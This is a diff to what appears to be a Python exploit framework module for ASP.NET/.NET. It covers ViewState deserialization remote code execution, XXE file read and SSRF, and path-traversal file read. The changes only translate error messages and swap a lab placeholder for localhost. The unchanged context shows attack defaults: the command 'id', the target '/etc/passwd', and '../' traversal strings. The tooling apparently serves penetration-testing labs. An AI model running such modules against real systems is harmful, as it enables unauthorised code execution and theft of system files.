@@ -38,7 +38,7 @@ def _viewstate_rce(params) -> dict:
     """ASP.NET ViewState deserialization RCE."""
     url = (params.get("url") or params.get("target") or "").strip()
     if not url:
-        return {"ok": False, "success": False, "error": "url gerekli"}
+        return {"ok": False, "success": False, "error": "url required"}
 
     cmd = (params.get("cmd") or "id").strip()
     machine_key = (params.get("machine_key") or "").strip()
@@ -95,7 +95,7 @@ def _xxe(params) -> dict:
     """ASP.NET/.NET XXE (XML External Entity) — arbitrary file read / SSRF."""
     url = (params.get("url") or params.get("target") or "").strip()
     if not url:
-        return {"ok": False, "success": False, "error": "url gerekli"}
+        return {"ok": False, "success": False, "error": "url required"}
 
     file_path = (params.get("file") or params.get("path") or "/etc/passwd").strip()
     method = (params.get("method") or "POST").strip().upper()
@@ -159,7 +159,7 @@ def _lfi(params) -> dict:
     """ASP.NET/.NET Path Traversal LFI — arbitrary file read."""
     url = (params.get("url") or params.get("target") or "").strip()
     if not url:
-        return {"ok": False, "success": False, "error": "url gerekli"}
+        return {"ok": False, "success": False, "error": "url required"}
 
     param = (params.get("param") or "file").strip()
     path_val = (params.get("path") or params.get("file") or "../../../../../../etc/passwd").strip()
@@ -227,7 +227,7 @@ EXPLOITS = {
         "affected": [".NET Framework 4.0-4.8", "ASP.NET (classic)"],
         "note": "ViewState with weak/known machine_key → BinaryFormatter gadget → RCE. Native: scanner sends crafted ViewState cookie.",
         "inputs": [
-            _in("Hedef URL", "url", True, "", "http://LAB_IP:8080/default.aspx"),
+            _in("Hedef URL", "url", True, "", "http://127.0.0.1:8080/default.aspx"),
             _in("Komut", "cmd", False, "id", "id | whoami"),
             _in("Machine Key", "machine_key", False, "", "decryptionKey:validationKey"),
             _in("ViewState field", "viewstate_field", False, "ViewState", "ViewState"),
@@ -241,7 +241,7 @@ EXPLOITS = {
         "affected": [".NET XML parsers (XmlDocument, XmlReader)", "ASP.NET (classic + Core)"],
         "note": "XXE (CWE-611) — .NET XML parser with external entity processing → arbitrary file read / SSRF.",
         "inputs": [
-            _in("Hedef URL", "url", True, "", "http://LAB_IP:8080/api/xml"),
+            _in("Hedef URL", "url", True, "", "http://127.0.0.1:8080/api/xml"),
             _in("Dosya", "file", False, "/etc/passwd", "/etc/passwd | C:\\Windows\\Win.ini"),
             _in("Method", "method", False, "POST", "GET | POST"),
             _in("Param", "param", False, "xml", "xml | data"),
@@ -254,7 +254,7 @@ EXPLOITS = {
         "affected": [".NET file read endpoints", "ASP.NET (classic + Core)"],
         "note": "Path traversal LFI (CWE-22) — .NET file read without sanitization → arbitrary file read.",
         "inputs": [
-            _in("Hedef URL", "url", True, "", "http://LAB_IP:8080/read"),
+            _in("Hedef URL", "url", True, "", "http://127.0.0.1:8080/read"),
             _in("Param", "param", False, "file", "file | path"),
             _in("Path", "path", False, "../../../../../../etc/passwd", "../../../../../../etc/passwd"),
             _in("Method", "method", False, "GET", "GET | POST"),
